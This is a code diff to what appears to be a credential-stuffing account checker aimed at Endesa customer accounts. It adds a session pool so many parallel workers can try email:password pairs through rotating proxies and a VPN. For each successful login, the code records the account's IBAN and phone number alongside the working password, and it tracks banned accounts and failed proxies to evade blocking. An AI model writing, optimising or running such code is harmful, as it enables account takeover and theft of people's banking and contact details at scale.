@@ -9,6 +9,7 @@ from typing import Optional, List, Tuple, Dict
 from PyQt6.QtCore import QThread, pyqtSignal
 
 from src.core.endesa import EndesaClient
+from src.core.session_pool import SessionPool
 from src.network.vpn_manager import VPNManager
 from src.network.proxy_manager import ProxyManager
 
@@ -38,6 +39,11 @@ class BatchProcessorThread(QThread):
         self.vpn_manager = None
         self.running = True
         self.start_time = None
+        
+        # Initialize session pool for efficient session management
+        # Pool size scales with workers but not 1:1 since sessions are shared
+        pool_size = min(30, max(15, max_workers // 4))  # 15-30 sessions for any number of workers
+        self.session_pool = SessionPool(pool_size=pool_size, max_workers=max_workers)
         
         # Initialize proxy manager (will be set from main window if proxies are enabled)
         self.proxy_manager = None
@@ -404,62 +410,19 @@ class BatchProcessorThread(QThread):
                 else:
                     normalized_proxy = current_proxy
             
-            # Create client with scaled connection pool and retry configuration
-            client = EndesaClient(email, password, self.max_workers, self.max_retries, 
-                                 self.retry_delay, normalized_proxy, [])
-            
-            # Step 1: Try to login first with retry mechanism
-            try:
-                client.login()
-                login_successful = True
-            except Exception as login_error:
-                login_successful = False
-                error_msg = str(login_error)
+            # Use session pool with context manager for efficient session management
+            with EndesaClient(email, password, self.session_pool, self.max_retries, 
+                             self.retry_delay, normalized_proxy) as client:
                 
-                # Check for banned accounts (after all retries failed)
-                if "BANNED:" in error_msg:
-                    result = f"BANNED: Line {line_num} - {email} - {error_msg} (after {self.max_retries} retries)"
-                    
-                    # Mark proxy as failed if used
-                    if current_proxy and self.proxy_manager:
-                        self.proxy_manager.mark_proxy_failed(current_proxy)
-                    
-                    return result, "BANNED"
-                # Check for timeout errors - these should be retried
-                elif "timeout" in error_msg.lower() or "timed out" in error_msg.lower():
-                    result = f"TIMEOUT: Line {line_num} - {email} - {error_msg}"
-                    
-                    # Mark proxy as failed if used
-                    if current_proxy and self.proxy_manager:
-                        self.proxy_manager.mark_proxy_failed(current_proxy)
-                    
-                    return result, "TIMEOUT"  # Mark for retry
-                # Check for specific "Invalid URL '/sites/Satellite'" error - this is the only one we count as invalid
-                elif "invalid url '/sites/satellite'" in error_msg.lower():
-                    result = f"INVALID: Line {line_num} - {email} - Invalid URL Satellite"
-                    return result, "INVALID"
-                # All other login failures - don't write these to file
-                else:
-                    result = f"LOGIN_FAILED: Line {line_num} - {email} - {error_msg}"
-                    return result, "FAILED"  # Count as failed but don't write to file
-            
-            # Step 2: Only continue with data retrieval if login was successful
-            if login_successful:
+                # Step 1: Try to login first with retry mechanism
                 try:
-                    account_info = client.get_account_info()
+                    client.login()
+                    login_successful = True
+                except Exception as login_error:
+                    login_successful = False
+                    error_msg = str(login_error)
                     
-                    # Format result with password included
-                    result = f"SUCCESS: Line {line_num} - {email}:{password} - IBAN: {account_info['iban']} Phone: {account_info['phone']}"
-                    
-                    # Mark proxy as successful if used
-                    if current_proxy and self.proxy_manager:
-                        self.proxy_manager.mark_proxy_success(current_proxy)
-                    
-                    return result, "SUCCESS"
-                    
-                except Exception as data_error:
-                    error_msg = str(data_error)
-                    # Check for banned accounts during data retrieval (after all retries failed)
+                    # Check for banned accounts (after all retries failed)
                     if "BANNED:" in error_msg:
                         result = f"BANNED: Line {line_num} - {email} - {error_msg} (after {self.max_retries} retries)"
                         
@@ -468,19 +431,62 @@ class BatchProcessorThread(QThread):
                             self.proxy_manager.mark_proxy_failed(current_proxy)
                         
                         return result, "BANNED"
-                    # Check for "no retrieve data" cases - write these to file
-                    elif "no retrieve data" in error_msg.lower() or "data not found" in error_msg.lower():
-                        result = f"NO_DATA: Line {line_num} - {email}:{password} - No data retrieved"
+                    # Check for timeout errors - these should be retried
+                    elif "timeout" in error_msg.lower() or "timed out" in error_msg.lower():
+                        result = f"TIMEOUT: Line {line_num} - {email} - {error_msg}"
                         
-                        # Mark proxy as successful if used (since we got a valid response)
+                        # Mark proxy as failed if used
+                        if current_proxy and self.proxy_manager:
+                            self.proxy_manager.mark_proxy_failed(current_proxy)
+                        
+                        return result, "TIMEOUT"  # Mark for retry
+                    # Check for specific "Invalid URL '/sites/Satellite'" error - this is the only one we count as invalid
+                    elif "invalid url '/sites/satellite'" in error_msg.lower():
+                        result = f"INVALID: Line {line_num} - {email} - Invalid URL Satellite"
+                        return result, "INVALID"
+                    # All other login failures - don't write these to file
+                    else:
+                        result = f"LOGIN_FAILED: Line {line_num} - {email} - {error_msg}"
+                        return result, "FAILED"  # Count as failed but don't write to file
+                
+                # Step 2: Only continue with data retrieval if login was successful
+                if login_successful:
+                    try:
+                        account_info = client.get_account_info()
+                        
+                        # Format result with password included
+                        result = f"SUCCESS: Line {line_num} - {email}:{password} - IBAN: {account_info['iban']} Phone: {account_info['phone']}"
+                        
+                        # Mark proxy as successful if used
                         if current_proxy and self.proxy_manager:
                             self.proxy_manager.mark_proxy_success(current_proxy)
                         
-                        return result, "NO_DATA"
-                    else:
-                        result = f"ERROR: Line {line_num} - {email} - Data retrieval failed: {error_msg}"
-                        return result, "FAILED"
+                        return result, "SUCCESS"
                         
+                    except Exception as data_error:
+                        error_msg = str(data_error)
+                        # Check for banned accounts during data retrieval (after all retries failed)
+                        if "BANNED:" in error_msg:
+                            result = f"BANNED: Line {line_num} - {email} - {error_msg} (after {self.max_retries} retries)"
+                            
+                            # Mark proxy as failed if used
+                            if current_proxy and self.proxy_manager:
+                                self.proxy_manager.mark_proxy_failed(current_proxy)
+                            
+                            return result, "BANNED"
+                        # Check for "no retrieve data" cases - write these to file
+                        elif "no retrieve data" in error_msg.lower() or "data not found" in error_msg.lower():
+                            result = f"NO_DATA: Line {line_num} - {email}:{password} - No data retrieved"
+                            
+                            # Mark proxy as successful if used (since we got a valid response)
+                            if current_proxy and self.proxy_manager:
+                                self.proxy_manager.mark_proxy_success(current_proxy)
+                            
+                            return result, "NO_DATA"
+                        else:
+                            result = f"ERROR: Line {line_num} - {email} - Data retrieval failed: {error_msg}"
+                            return result, "FAILED"
+                            
         except Exception as e:
             result = f"ERROR: Line {line_num} - {email} - {str(e)}"
             
@@ -489,10 +495,6 @@ class BatchProcessorThread(QThread):
                 self.proxy_manager.mark_proxy_failed(current_proxy)
             
             return result, "FAILED"
-        finally:
-            # Always close the client to free connection pool resources
-            if 'client' in locals():
-                client.close()
     
     def _write_result_to_file(self, result: str):
         """Write a single result immediately to file."""
@@ -518,6 +520,9 @@ class BatchProcessorThread(QThread):
         """Stop the processing safely."""
         try:
             self.running = False
+            # Clean up session pool
+            if hasattr(self, 'session_pool') and self.session_pool:
+                self.session_pool.close_all()
             # The thread will naturally exit when the while loop condition becomes false
         except Exception as e:
             # If anything goes wrong, just set running to False
